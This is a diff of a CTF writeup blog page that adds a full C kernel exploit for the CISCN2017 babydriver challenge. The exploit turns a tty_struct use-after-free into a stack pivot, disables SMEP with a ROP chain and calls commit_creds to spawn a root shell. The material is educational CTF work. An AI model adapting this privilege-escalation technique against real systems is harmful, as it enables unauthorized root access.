@@ -69,7 +69,7 @@
 
 <meta itemprop="datePublished" content="2018-10-06T12:57:09&#43;08:00" />
 <meta itemprop="dateModified" content="2018-10-06T12:57:09&#43;08:00" />
-<meta itemprop="wordCount" content="2313">
+<meta itemprop="wordCount" content="2642">
 
 
 
@@ -314,8 +314,8 @@
             <a href="https://bash-c.github.io/categories/writeup/"> writeup </a>
             
           </div>
-        <span class="more-meta"> 2313 words </span>
-          <span class="more-meta"> 5 min read </span>
+        <span class="more-meta"> 2642 words </span>
+          <span class="more-meta"> 6 min read </span>
 
         
         
@@ -976,11 +976,181 @@ flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36
 </div>
 <p>那么我们就可以通过不同的操作（如 <code>write, ioctl</code> 等）来跳转到不同的 evil 了。</p>
 
-<p>对这道题目而言，因为开启了 smep 保护，因此如果想 ret2usr 提权，需要修改 cr4 的值，而控制函数指针是不够的，可以控制函数指针到我们排布 rop 链的空间，通过 rop 关闭 smep，进而进行后续操作。</p>
+<p>对这道题目而言，因为开启了 smep 保护，因此如果想 ret2usr 提权，需要修改 cr4 的值，而控制函数指针是不够的，可以控制函数指针进行 stack pivot 等操作到我们排布 rop 链的空间，通过 rop 关闭 smep，进而进行后续操作。</p>
 
 <blockquote>
 <p>这道题目没给 vmlinux，需要使用 <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a> 解压内核镜像。</p>
 </blockquote>
+
+<p>关闭 smep 保护后，就可以通过 rop 来为所欲为了，最终的 <a href="https://github.com/bash-c/pwn_repo/blob/master/CISCN2017_babydriver/uaf_tty_struct.c">exp</a> 如下:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="cp">#define prepare_kernel_cred_addr 0xffffffff810a1810
+</span><span class="cp">#define commit_creds_addr 0xffffffff810a1420
+</span><span class="cp"></span>
+<span class="kt">void</span><span class="o">*</span> <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">30</span><span class="p">];</span>
+
+<span class="n">size_t</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>
+<span class="kt">void</span> <span class="nf">save_status</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="n">__asm__</span><span class="p">(</span><span class="s">&#34;mov user_cs, cs;&#34;</span>
+			<span class="s">&#34;mov user_ss, ss;&#34;</span>
+			<span class="s">&#34;mov user_sp, rsp;&#34;</span>
+			<span class="s">&#34;pushf;&#34;</span>
+			<span class="s">&#34;pop user_rflags;&#34;</span>
+			<span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*]status has been saved.&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+
+<span class="kt">void</span> <span class="nf">get_shell</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">get_root</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="n">pkc</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span> <span class="o">=</span> <span class="n">prepare_kernel_cred_addr</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">cc</span><span class="p">)(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span> <span class="o">=</span> <span class="n">commit_creds_addr</span><span class="p">;</span>
+    <span class="p">(</span><span class="o">*</span><span class="n">cc</span><span class="p">)((</span><span class="o">*</span><span class="n">pkc</span><span class="p">)(</span><span class="mi">0</span><span class="p">));</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">save_status</span><span class="p">();</span>
+
+	<span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">size_t</span> <span class="n">rop</span><span class="p">[</span><span class="mi">32</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff810d238d</span><span class="p">;</span>		<span class="c1">// pop rdi; ret;
+</span><span class="c1"></span>    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x6f0</span><span class="p">;</span>
+    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff81004d80</span><span class="p">;</span>		<span class="c1">// mov cr4, rdi; pop rbp; ret;
+</span><span class="c1"></span>    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span><span class="n">get_root</span><span class="p">;</span>
+    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff81063694</span><span class="p">;</span>		<span class="c1">// swapgs; pop rbp; ret;
+</span><span class="c1"></span>    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff814e35ef</span><span class="p">;</span>		<span class="c1">// iretq; ret;
+</span><span class="c1"></span>    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span><span class="n">get_shell</span><span class="p">;</span>
+    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>                <span class="cm">/* saved CS */</span>
+    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>            <span class="cm">/* saved EFLAGS */</span>
+    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
+    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
+
+	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">30</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">fake_tty_operations</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF8181BFC5</span><span class="p">;</span> 
+	<span class="p">}</span>
+    <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff810635f5</span><span class="p">;</span>  <span class="c1">//pop rax; pop rbp; ret;
+</span><span class="c1"></span>    <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span><span class="n">rop</span><span class="p">;</span>
+    <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF8181BFC5</span><span class="p">;</span>  <span class="c1">// mov rsp,rax ; dec ebx ; ret
+</span><span class="c1"></span>
+    <span class="kt">int</span> <span class="n">fd1</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/babydev&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">fd2</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/babydev&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="mh">0x10001</span><span class="p">,</span> <span class="mh">0x2e0</span><span class="p">);</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">fd1</span><span class="p">);</span>
+
+    <span class="kt">int</span> <span class="n">fd_tty</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/ptmx&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="o">|</span><span class="n">O_NOCTTY</span><span class="p">);</span>
+    <span class="n">size_t</span> <span class="n">fake_tty_struct</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="n">read</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span> <span class="n">fake_tty_struct</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
+    <span class="n">fake_tty_struct</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span><span class="n">fake_tty_operations</span><span class="p">;</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span><span class="n">fake_tty_struct</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
+
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x8</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">fd_tty</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
     </div>
 
     
